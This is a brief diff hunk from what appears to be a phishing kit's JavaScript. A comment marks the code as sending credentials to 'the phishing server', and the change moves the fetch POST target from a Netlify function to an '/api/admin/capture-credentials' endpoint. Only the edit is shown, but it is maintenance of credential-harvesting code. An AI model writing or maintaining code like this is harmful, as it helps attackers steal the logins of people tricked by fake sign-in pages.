@@ -372,7 +372,7 @@
 
       // Send credentials to the phishing server
       try {
-        const response = await fetch('/.netlify/functions/capture-credentials', {
+        const response = await fetch('/api/admin/capture-credentials', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
